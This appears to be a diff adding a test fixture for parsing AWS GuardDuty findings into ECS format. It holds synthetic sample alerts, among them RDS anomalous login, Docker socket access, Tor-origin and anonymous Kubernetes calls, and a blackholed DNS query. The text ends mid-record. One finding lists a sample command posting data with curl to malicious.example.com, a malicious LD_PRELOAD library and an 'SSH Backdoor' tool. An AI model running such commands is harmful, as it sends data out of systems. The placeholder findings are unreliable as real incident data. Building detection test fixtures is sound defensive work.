+      "cloud": {
+        "account": {
+          "id": "123412341234"
+        },
+        "provider": "aws",
+        "region": "us-east-1",
+        "service": {
+          "name": "guardduty"
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "action": "RDS_LOGIN_ATTEMPT",
+        "created": "2050-12-07T10:28:35.948Z",
+        "end": "2050-12-07T10:28:35.000Z",
+        "id": "6beccaafbcbcabdcebc0a028025900f4",
+        "kind": [
+          "alert"
+        ],
+        "original": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"6beccaafbcbcabdcebc0a028025900f4\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/4ec22961e1defabcdefabcdef2a1234/finding/6beccaafbcbcabdcebc0a028025900f4\",\"type\":\"CredentialAccess:RDS/AnomalousBehavior.SuccessfulLogin\",\"resource\":{\"resourceType\":\"RDSDBInstance\",\"rdsDbInstanceDetails\":{\"dbInstanceIdentifier\":\"GeneratedFindingDBInstanceId\",\"engine\":\"GeneratedFindingEngine\",\"engineVersion\":\"13.6\",\"dbClusterIdentifier\":\"GeneratedFindingDBClusterId\",\"dbInstanceArn\":\"arn:aws:rds:us-east-1:123456789000:db:GeneratedFindingDBInstanceId\"},\"rdsDbUserDetails\":{\"user\":\"PficnbsefEpzcmpzRybsRakc\",\"application\":\"GeneratedFindingApplicationName\",\"database\":\"GeneratedFindingDatabaseName\",\"ssl\":\"GeneratedSSLValue\",\"authMethod\":\"GeneratedFindingAuthMethod\"}},\"service\":{\"action\":{\"actionType\":\"RDS_LOGIN_ATTEMPT\",\"rdsLoginAttemptAction\":{\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingAsnOrg\",\"isp\":\"GeneratedFindingIsp\",\"org\":\"GeneratedFindingOrg\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}}}},\"additionalInfo\":{\"unusualBehavior\":{\"unusualUserNameClusterProfiling\":{\"userName\":\"PficnbsefEpzcmpzRybsRakc\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualASNClusterProfiling\":{\"asnOrg\":\"GeneratedFindingAsnOrg\",\"failedLoginCount\":0,\"successfulLoginCount\":10,\"incompleteConnectionCount\":0},\"unusualApplicationNameClusterProfiling\":{\"applicationName\":\"GeneratedFindingApplicationName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualDatabaseNameClusterProfiling\":{\"databaseName\":\"GeneratedFindingDatabaseName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0}},\"sample\":true,\"value\":\"{\\\"unusualBehavior\\\":{\\\"unusualUserNameClusterProfiling\\\":{\\\"userName\\\":\\\"PficnbsefEpzcmpzRybsRakc\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0},\\\"unusualASNClusterProfiling\\\":{\\\"asnOrg\\\":\\\"GeneratedFindingAsnOrg\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":10,\\\"incompleteConnectionCount\\\":0},\\\"unusualApplicationNameClusterProfiling\\\":{\\\"applicationName\\\":\\\"GeneratedFindingApplicationName\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0},\\\"unusualDatabaseNameClusterProfiling\\\":{\\\"databaseName\\\":\\\"GeneratedFindingDatabaseName\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0}},\\\"sample\\\":true}\",\"type\":\"default\"},\"resourceRole\":\"TARGET\",\"evidence\":null,\"count\":1,\"detectorId\":\"4ec22961e1defabcdefabcdef2a1234\",\"eventFirstSeen\":\"2050-12-07T10:28:35.000Z\",\"eventLastSeen\":\"2050-12-07T10:28:35.000Z\",\"serviceName\":\"guardduty\",\"archived\":false},\"createdAt\":\"2050-12-07T10:28:35.948Z\",\"severity\":8,\"updatedAt\":\"2050-12-07T10:28:35.948Z\",\"title\":\"Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.\",\"description\":\"Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.\"}",
+        "severity": 8,
+        "start": "2050-12-07T10:28:35.000Z",
+        "type": [
+          "info"
+        ]
+      },
+      "message": "Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.",
+      "related": {
+        "ip": [
+          "192.0.2.87"
+        ],
+        "user": [
+          "PficnbsefEpzcmpzRybsRakc"
+        ]
+      },
+      "rule": {
+        "category": "CredentialAccess",
+        "name": "CredentialAccess:RDS/AnomalousBehavior.SuccessfulLogin",
+        "ruleset": "CredentialAccess:RDS"
+      },
+      "source": {
+        "address": [
+          "192.0.2.87"
+        ],
+        "as": {
+          "number": [
+            0
+          ],
+          "organization": {
+            "name": [
+              "GeneratedFindingAsnOrg"
+            ]
+          }
+        },
+        "geo": {
+          "city_name": [
+            "GeneratedFindingCityName"
+          ],
+          "country_name": [
+            "GeneratedFindingCountryName"
+          ],
+          "location": [
+            {
+              "lat": 0,
+              "lon": 0
+            }
+          ]
+        }
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "user": {
+        "name": [
+          "PficnbsefEpzcmpzRybsRakc"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2052-10-04T04:09:13.066Z",
+      "aws": {
+        "guardduty": {
+          "account_id": "123456789",
+          "arn": "arn:aws:guardduty:us-west-1:abcd1234:detector/abcd1234/finding/abcd1234",
+          "created_at": "2052-07-24T04:06:10.359Z",
+          "description": "A process is communicating with a docker socket using a unix socket.",
+          "id": "abcd1234",
+          "partition": "aws",
+          "region": "us-west-1",
+          "resource": {
+            "container_details": {
+              "container_runtime": "docker",
+              "id": "abcd1234",
+              "image": {
+                "value": "[abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37](https://abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37)"
+              }
+            },
+            "instance_details": {
+              "availability_zone": "us-west-1b",
+              "iaminstance_profile": {
+                "arn": "arn:aws:iam::abcd1234:instance-profile/buildserver_profile",
+                "id": "AAAAAAAAAAAAAAAAAAA"
+              },
+              "image": {
+                "description": "Ubuntu 20.04 AMI with Docker installed",
+                "id": "ami-abcd1234"
+              },
+              "instance": {
+                "id": "i-abcd1234",
+                "state": "running",
+                "type": "m2.large"
+              },
+              "launch_time": "2052-07-29T17:58:17.000Z",
+              "network_interfaces": [
+                {
+                  "network_interface_id": "eni-abcd1234",
+                  "private": {
+                    "dns_name": "[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal",
+                    "ip_address": "10.198.37.234",
+                    "ip_addresses": [
+                      {
+                        "private": {
+                          "dns_name": "[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal",
+                          "ip_address": "10.198.37.234"
+                        }
+                      }
+                    ]
+                  },
+                  "public": {
+                    "dns_name": "[ec2-216.160.83.56.us-west-1.compute.amazonaws.com](https://ec2-198.51.100.124.us-west-1.compute.amazonaws.com/)",
+                    "ip": "198.51.100.124"
+                  },
+                  "security_groups": [
+                    {
+                      "group": {
+                        "id": "sg-abcd1234",
+                        "name": "build"
+                      }
+                    },
+                    {
+                      "group": {
+                        "id": "sg-abcd1234",
+                        "name": "main"
+                      }
+                    }
+                  ],
+                  "subnet_id": "subnet-abcd1234",
+                  "vpc_id": "vpc-abcd1234"
+                }
+              ],
+              "tags": [
+                {
+                  "key": "Name",
+                  "value": "buildserver-a-0"
+                },
+                {
+                  "key": "group",
+                  "value": "build-server"
+                }
+              ]
+            },
+            "type": "Container"
+          },
+          "schema_version": "2.0",
+          "service": {
+            "additional_info": {
+              "type": "default",
+              "value": "{}"
+            },
+            "archived": false,
+            "count": 9,
+            "detector_id": "abcd1234",
+            "event": {
+              "first_seen": "2052-07-24T04:03:51.666Z",
+              "last_seen": "2052-10-04T04:06:30.383Z"
+            },
+            "feature_name": "RuntimeMonitoring",
+            "runtime_details": {
+              "context": {
+                "address_family": "AF_INET",
+                "command_line_example": "/usr/bin/curl -X POST http://malicious.example.com",
+                "file_system_type": "ext4",
+                "flags": [
+                  "ro"
+                ],
+                "iana_protocol_number": "6",
+                "ld_preload": "/usr/lib/libmalicious.so",
+                "library_path": "/usr/lib/libc.so.6",
+                "memory_regions": [
+                  "heap",
+                  "stack"
+                ],
+                "modified_at": "2052-10-07T18:45:30.000Z",
+                "modifying_process": {
+                  "name": "bash",
+                  "pid": 2451,
+                  "user": "root"
+                },
+                "module_file_path": "/lib/modules/5.15.0-1023-generic/kernel/net/ipv4/netfilter/ipt_MAL.so",
+                "module_name": "ipt_MAL",
+                "module_sha256": "2e13db4b450d80841659cfde061e0cc9",
+                "mount_source": "/dev/sda1",
+                "mount_target": "/mnt/data",
+                "release_agent_path": "/mnt/container/release_agent",
+                "runc_binary_path": "/usr/sbin/runc",
+                "script_path": "/usr/local/bin/malicious_script.sh",
+                "service_name": "firewalld",
+                "shell_history_file_path": "/root/.bash_history",
+                "socket_path": "/var/run/docker.sock",
+                "target_process": {
+                  "name": "sshd",
+                  "pid": 3124,
+                  "user": "admin"
+                },
+                "threat_file_path": "/tmp/malicious_file.bin",
+                "tool_category": "Backdoor Tool",
+                "tool_name": "SSH Backdoor"
+              },
+              "process": {
+                "euid": 1000,
+                "executable_path": "/usr/bin/ssh",
+                "executable_sha256": "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2",
+                "lineage": [
+                  {
+                    "ancestorName": "sshd",
+                    "ancestorPid": 123,
+                    "parentUuid": "f1f3e825-2698-40f8-8763-0e239dc4b2fe"
+                  },
+                  {
+                    "ancestorName": "apache2",
+                    "ancestorPid": 456,
+                    "parentUuid": "d55f6d53-0d8c-4f57-b50d-9c6b83aeed04"
+                  }
+                ],
+                "name": "sshd",
+                "namespace_pid": 456,
+                "parent_uuid": "f1f3e825-2698-40f8-8763-0e239dc4b2fe",
+                "pid": 2345,
+                "pwd": "/home/user",
+                "start_time": "2052-10-04T04:06:30.377Z",
+                "user": "admin",
+                "user_id": 1000,
+                "uuid": "abc12345-def6-7890-ghij-klmnopqrstuv"
+              }
+            },
+            "service_name": "guardduty"
+          },
+          "severity": {
+            "code": 5.0,
+            "value": "Medium"
+          },
+          "title": "A container is communicating with a docker socket.",
+          "type": "PrivilegeEscalation:Runtime/DockerSocketAccessed",
+          "updated_at": "2052-10-04T04:09:13.066Z"
+        }
+      },
+      "cloud": {
+        "account": {
+          "id": "123456789"
+        },
+        "instance": {
+          "id": "i-abcd1234"
+        },
+        "machine": {
+          "type": "m2.large"
+        },
+        "provider": "aws",
+        "region": "us-west-1",
+        "service": {
+          "name": "guardduty"
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "created": "2052-07-24T04:06:10.359Z",
+        "end": "2052-10-04T04:06:30.383Z",
+        "id": "abcd1234",
+        "kind": [
+          "alert"
+        ],
+        "original": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123456789\",\"region\":\"us-west-1\",\"partition\":\"aws\",\"id\":\"abcd1234\",\"arn\":\"arn:aws:guardduty:us-west-1:abcd1234:detector/abcd1234/finding/abcd1234\",\"type\":\"PrivilegeEscalation:Runtime/DockerSocketAccessed\",\"resource\":{\"resourceType\":\"Container\",\"instanceDetails\":{\"instanceId\":\"i-abcd1234\",\"instanceType\":\"m2.large\",\"launchTime\":\"2052-07-29T17:58:17.000Z\",\"platform\":null,\"productCodes\":[],\"iamInstanceProfile\":{\"arn\":\"arn:aws:iam::abcd1234:instance-profile/buildserver_profile\",\"id\":\"AAAAAAAAAAAAAAAAAAA\"},\"networkInterfaces\":[{\"ipv6Addresses\":[],\"networkInterfaceId\":\"eni-abcd1234\",\"privateDnsName\":\"[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal\",\"privateIpAddress\":\"10.198.37.234\",\"privateIpAddresses\":[{\"privateDnsName\":\"[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal\",\"privateIpAddress\":\"10.198.37.234\"}],\"subnetId\":\"subnet-abcd1234\",\"vpcId\":\"vpc-abcd1234\",\"securityGroups\":[{\"groupName\":\"build\",\"groupId\":\"sg-abcd1234\"},{\"groupName\":\"main\",\"groupId\":\"sg-abcd1234\"}],\"publicDnsName\":\"[ec2-216.160.83.56.us-west-1.compute.amazonaws.com](https://ec2-198.51.100.124.us-west-1.compute.amazonaws.com/)\",\"publicIp\":\"198.51.100.124\"}],\"outpostArn\":null,\"tags\":[{\"key\":\"Name\",\"value\":\"buildserver-a-0\"},{\"key\":\"group\",\"value\":\"build-server\"}],\"instanceState\":\"running\",\"availabilityZone\":\"us-west-1b\",\"imageId\":\"ami-abcd1234\",\"imageDescription\":\"Ubuntu 20.04 AMI with Docker installed\"},\"containerDetails\":{\"containerRuntime\":\"docker\",\"id\":\"abcd1234\",\"name\":null,\"image\":\"[abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37](https://abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37)\",\"imageUid\":null,\"volumeMounts\":null,\"securityContext\":null,\"imagePrefix\":null}},\"service\":{\"serviceName\":\"guardduty\",\"featureName\":\"RuntimeMonitoring\",\"detectorId\":\"abcd1234\",\"action\":{},\"runtimeDetails\":{\"context\":{\"addressFamily\":\"AF_INET\",\"commandLineExample\":\"/usr/bin/curl -X POST http://malicious.example.com\",\"fileSystemType\":\"ext4\",\"flags\":[\"ro\"],\"ianaProtocolNumber\":6,\"ldPreloadValue\":\"/usr/lib/libmalicious.so\",\"libraryPath\":\"/usr/lib/libc.so.6\",\"memoryRegions\":[\"heap\",\"stack\"],\"modifiedAt\":\"2052-10-07T18:45:30Z\",\"modifyingProcess\":{\"name\":\"bash\",\"pid\":2451,\"user\":\"root\"},\"moduleFilePath\":\"/lib/modules/5.15.0-1023-generic/kernel/net/ipv4/netfilter/ipt_MAL.so\",\"moduleName\":\"ipt_MAL\",\"moduleSha256\":\"2e13db4b450d80841659cfde061e0cc9\",\"mountSource\":\"/dev/sda1\",\"mountTarget\":\"/mnt/data\",\"releaseAgentPath\":\"/mnt/container/release_agent\",\"runcBinaryPath\":\"/usr/sbin/runc\",\"scriptPath\":\"/usr/local/bin/malicious_script.sh\",\"serviceName\":\"firewalld\",\"shellHistoryFilePath\":\"/root/.bash_history\",\"socketPath\":\"/var/run/docker.sock\",\"targetProcess\":{\"name\":\"sshd\",\"pid\":3124,\"user\":\"admin\"},\"threatFilePath\":\"/tmp/malicious_file.bin\",\"toolCategory\":\"Backdoor Tool\",\"toolName\":\"SSH Backdoor\"},\"process\":{\"euid\":1000,\"executablePath\":\"/usr/bin/ssh\",\"executableSha256\":\"d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2\",\"lineage\":[{\"parentUuid\":\"f1f3e825-2698-40f8-8763-0e239dc4b2fe\",\"ancestorPid\":123,\"ancestorName\":\"sshd\"},{\"parentUuid\":\"d55f6d53-0d8c-4f57-b50d-9c6b83aeed04\",\"ancestorPid\":456,\"ancestorName\":\"apache2\"}],\"name\":\"sshd\",\"namespacePid\":456,\"parentUuid\":\"f1f3e825-2698-40f8-8763-0e239dc4b2fe\",\"pid\":2345,\"pwd\":\"/home/user\",\"startTime\":2611627590.3773646,\"user\":\"admin\",\"userId\":1000,\"uuid\":\"abc12345-def6-7890-ghij-klmnopqrstuv\"}},\"additionalInfo\":{\"value\":\"{}\",\"type\":\"default\"},\"eventFirstSeen\":\"2052-07-24T04:03:51.666Z\",\"eventLastSeen\":\"2052-10-04T04:06:30.383Z\",\"archived\":false,\"count\":9},\"severity\":5,\"createdAt\":\"2052-07-24T04:06:10.359Z\",\"updatedAt\":\"2052-10-04T04:09:13.066Z\",\"title\":\"A container is communicating with a docker socket.\",\"description\":\"A process is communicating with a docker socket using a unix socket.\"}",
+        "severity": 5,
+        "start": "2052-07-24T04:03:51.666Z",
+        "type": [
+          "info"
+        ]
+      },
+      "host": {
+        "id": "i-abcd1234",
+        "type": "m2.large"
+      },
+      "message": "A process is communicating with a docker socket using a unix socket.",
+      "network": {
+        "iana_number": "6"
+      },
+      "process": {
+        "executable": "/usr/bin/ssh",
+        "name": "sshd",
+        "pid": 2345,
+        "start": "2052-10-04T04:06:30.377Z",
+        "working_directory": "/home/user"
+      },
+      "related": {
+        "hash": [
+          "2e13db4b450d80841659cfde061e0cc9",
+          "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2"
+        ],
+        "ip": [
+          "10.198.37.234",
+          "198.51.100.124"
+        ]
+      },
+      "rule": {
+        "category": "PrivilegeEscalation",
+        "name": "PrivilegeEscalation:Runtime/DockerSocketAccessed",
+        "ruleset": "PrivilegeEscalation:Runtime"
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "threat": {
+        "indicator": {
+          "file": {
+            "path": "/tmp/malicious_file.bin"
+          }
+        },
+        "software": {
+          "name": "SSH Backdoor"
+        }
+      }
+    },
+    {
+      "_compat_error": "no result"
+    }
+  ],
+  "input": [
+    {
+      "message": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"d6012345678912345678912349f831b8f\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/d60123456789e5461eabcd1234abcd1234/finding/d6012345678912345678912349f831b8f\",\"type\":\"Trojan:EC2/BlackholeTraffic!DNS\",\"resource\":{\"resourceType\":\"Instance\",\"instanceDetails\":{\"instanceId\":\"i-99999999\",\"instanceType\":\"m3.xlarge\",\"outpostArn\":\"arn:aws:outposts:us-west-2:123456789000:outpost/op-abcdefabcdef1234\",\"launchTime\":\"2044-08-02T02:05:06.000Z\",\"platform\":null,\"productCodes\":[{\"productCodeId\":\"GeneratedFindingProductCodeId\",\"productCodeType\":\"GeneratedFindingProductCodeType\"}],\"iamInstanceProfile\":{\"arn\":\"arn:aws:iam::123412341234:example/instance/profile\",\"id\":\"GeneratedFindingInstanceProfileId\"},\"networkInterfaces\":[{\"networkInterfaceId\":\"eni-abcdef888\",\"privateIpAddresses\":[{\"privateDnsName\":\"GeneratedFindingPrivateName\",\"privateIpAddress\":\"192.0.2.87\"}],\"subnetId\":\"GeneratedFindingSubnetId\",\"vpcId\":\"GeneratedFindingVPCId\",\"privateDnsName\":\"GeneratedFindingPrivateDnsName\",\"securityGroups\":[{\"groupName\":\"GeneratedFindingSecurityGroupName\",\"groupId\":\"GeneratedFindingSecurityId\"}],\"publicIp\":\"192.0.2.87\",\"ipv6Addresses\":[],\"publicDnsName\":\"GeneratedFindingPublicDNSName\",\"privateIpAddress\":\"192.0.2.87\"}],\"tags\":[{\"value\":\"GeneratedFindingInstaceValue1\",\"key\":\"GeneratedFindingInstaceTag1\"},{\"value\":\"GeneratedFindingInstaceTagValue2\",\"key\":\"GeneratedFindingInstaceTag2\"},{\"value\":\"GeneratedFindingInstaceTagValue3\",\"key\":\"GeneratedFindingInstaceTag3\"},{\"value\":\"GeneratedFindingInstaceTagValue4\",\"key\":\"GeneratedFindingInstaceTag4\"},{\"value\":\"GeneratedFindingInstaceTagValue5\",\"key\":\"GeneratedFindingInstaceTag5\"},{\"value\":\"GeneratedFindingInstaceTagValue6\",\"key\":\"GeneratedFindingInstaceTag6\"},{\"value\":\"GeneratedFindingInstaceTagValue7\",\"key\":\"GeneratedFindingInstaceTag7\"},{\"value\":\"GeneratedFindingInstaceTagValue8\",\"key\":\"GeneratedFindingInstaceTag8\"},{\"value\":\"GeneratedFindingInstaceTagValue9\",\"key\":\"GeneratedFindingInstaceTag9\"}],\"instanceState\":\"running\",\"availabilityZone\":\"GeneratedFindingInstaceAvailabilityZone\",\"imageId\":\"ami-99999999\",\"imageDescription\":\"GeneratedFindingInstaceImageDescription\"}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"d60123456789e5461eabcd1234abcd1234\",\"action\":{\"actionType\":\"DNS_REQUEST\",\"dnsRequestAction\":{\"domain\":\"GeneratedFindingDomainName\",\"protocol\":\"UDP\",\"blocked\":true}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true,\"value\":\"{\\\"threatListName\\\":\\\"GeneratedFindingThreatListName\\\",\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":{\"threatIntelligenceDetails\":[{\"threatNames\":[\"GeneratedFindingThreatName\"],\"threatListName\":\"GeneratedFindingThreatListName\"}]},\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":5,\"createdAt\":\"2050-11-17T09:33:19.224Z\",\"updatedAt\":\"2050-11-22T12:22:20.934Z\",\"title\":\"Blackholed domain name queried by EC2 instance i-99999999.\",\"description\":\"EC2 instance i-99999999 is querying a domain name of a blackholed domain.\"}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"250023a9abcdefabcdef12345678\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/abddcde15bc7306fcbcf9452daef3891/finding/250023a9abcdefabcdef12345678\",\"type\":\"Persistence:Kubernetes/SuccessfulAnonymousAccess\",\"resource\":{\"resourceType\":\"EKSCluster\",\"eksClusterDetails\":{\"name\":\"GeneratedFindingEKSClusterName\",\"arn\":\"GeneratedFindingEKSClusterArn\",\"createdAt\":2520238555.218,\"vpcId\":\"GeneratedFindingEKSClusterVpcId\",\"status\":\"ACTIVE\",\"tags\":[{\"value\":\"GeneratedFindingEKSClusterTagValue1\",\"key\":\"GeneratedFindingEKSClusterTag1\"},{\"value\":\"GeneratedFindingEKSClusterTagValue2\",\"key\":\"GeneratedFindingEKSClusterTag2\"},{\"value\":\"GeneratedFindingEKSClusterTagValue3\",\"key\":\"GeneratedFindingEKSClusterTag3\"}]},\"kubernetesDetails\":{\"kubernetesWorkloadDetails\":null,\"kubernetesUserDetails\":{\"username\":\"system:anonymous\",\"uid\":\"GeneratedFindingUID\",\"groups\":[\"system:unauthenticated\"]}}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"abddcde15bc7306fcbcf9452daef3891\",\"action\":{\"actionType\":\"KUBERNETES_API_CALL\",\"kubernetesApiCallAction\":{\"requestUri\":\"GeneratedFindingRequestURI\",\"verb\":\"get\",\"sourceIPs\":[\"192.0.2.87\"],\"userAgent\":\"\",\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingASNOrg\",\"isp\":\"GeneratedFindingISP\",\"org\":\"GeneratedFindingORG\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}},\"statusCode\":200,\"parameters\":\"GeneratedFindingActionParameters\"}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"sample\":true,\"value\":\"{\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":null,\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":8,\"createdAt\":\"2050-11-17T09:33:19.225Z\",\"updatedAt\":\"2050-11-22T12:22:20.935Z\",\"title\":\"Kubernetes API commonly used in Persistence tactics invoked by the anonymous user.\",\"description\":\"Kubernetes API commonly used in Persistence tactics was invoked on cluster GeneratedFindingEKSClusterName by the anonymous user system:anonymous.\"}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"76e0bbfedecfdedbade4333922609164\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/12341234e19ce5461eabcd1234abcd1234/finding/76e0bbfedecfdedbade4333922609164\",\"type\":\"Discovery:Kubernetes/TorIPCaller\",\"resource\":{\"resourceType\":\"EKSCluster\",\"eksClusterDetails\":{\"name\":\"GeneratedFindingEKSClusterName\",\"arn\":\"GeneratedFindingEKSClusterArn\",\"createdAt\":2519575210.342,\"vpcId\":\"GeneratedFindingEKSClusterVpcId\",\"status\":\"ACTIVE\",\"tags\":[{\"value\":\"GeneratedFindingEKSClusterTagValue1\",\"key\":\"GeneratedFindingEKSClusterTag1\"},{\"value\":\"GeneratedFindingEKSClusterTagValue2\",\"key\":\"GeneratedFindingEKSClusterTag2\"},{\"value\":\"GeneratedFindingEKSClusterTagValue3\",\"key\":\"GeneratedFindingEKSClusterTag3\"}]},\"kubernetesDetails\":{\"kubernetesWorkloadDetails\":null,\"kubernetesUserDetails\":{\"username\":\"PficnbsefEpzcmpzRybsRakc\",\"uid\":\"GeneratedFindingUID\",\"groups\":[\"GeneratedFindingUserGroup\"]}},\"accessKeyDetails\":{\"accessKeyId\":\"GeneratedFindingAccessKeyId\",\"principalId\":\"GeneratedFindingPrincipalId\",\"userType\":\"Role\",\"userName\":\"PficnbsefEpzcmpzRybsRakc\"}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"12341234e19ce5461eabcd1234abcd1234\",\"action\":{\"actionType\":\"KUBERNETES_API_CALL\",\"kubernetesApiCallAction\":{\"requestUri\":\"GeneratedFindingRequestURI\",\"verb\":\"list\",\"sourceIPs\":[\"192.0.2.87\"],\"userAgent\":\"\",\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingASNOrg\",\"isp\":\"GeneratedFindingISP\",\"org\":\"GeneratedFindingORG\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}},\"statusCode\":200}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"threatName\":\"GeneratedFindingThreatName\",\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true,\"value\":\"{\\\"threatName\\\":\\\"GeneratedFindingThreatName\\\",\\\"threatListName\\\":\\\"GeneratedFindingThreatListName\\\",\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":{\"threatIntelligenceDetails\":[{\"threatNames\":[\"GeneratedFindingThreatName\"],\"threatListName\":\"GeneratedFindingThreatListName\"}]},\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":5,\"createdAt\":\"2050-11-17T09:33:19.228Z\",\"updatedAt\":\"2050-11-22T12:22:20.938Z\",\"title\":\"Kubernetes API commonly used in Discovery tactics invoked from a Tor exit node IP address.\",\"description\":\"Kubernetes API commonly used in Discovery tactics was invoked on cluster GeneratedFindingEKSClusterName from Tor exit node IP address 192.0.2.87.\"}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"6beccaafbcbcabdcebc0a028025900f4\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/4ec22961e1defabcdefabcdef2a1234/finding/6beccaafbcbcabdcebc0a028025900f4\",\"type\":\"CredentialAccess:RDS/AnomalousBehavior.SuccessfulLogin\",\"resource\":{\"resourceType\":\"RDSDBInstance\",\"rdsDbInstanceDetails\":{\"dbInstanceIdentifier\":\"GeneratedFindingDBInstanceId\",\"engine\":\"GeneratedFindingEngine\",\"engineVersion\":\"13.6\",\"dbClusterIdentifier\":\"GeneratedFindingDBClusterId\",\"dbInstanceArn\":\"arn:aws:rds:us-east-1:123456789000:db:GeneratedFindingDBInstanceId\"},\"rdsDbUserDetails\":{\"user\":\"PficnbsefEpzcmpzRybsRakc\",\"application\":\"GeneratedFindingApplicationName\",\"database\":\"GeneratedFindingDatabaseName\",\"ssl\":\"GeneratedSSLValue\",\"authMethod\":\"GeneratedFindingAuthMethod\"}},\"service\":{\"action\":{\"actionType\":\"RDS_LOGIN_ATTEMPT\",\"rdsLoginAttemptAction\":{\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingAsnOrg\",\"isp\":\"GeneratedFindingIsp\",\"org\":\"GeneratedFindingOrg\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}}}},\"additionalInfo\":{\"unusualBehavior\":{\"unusualUserNameClusterProfiling\":{\"userName\":\"PficnbsefEpzcmpzRybsRakc\",\"failedLoginCoun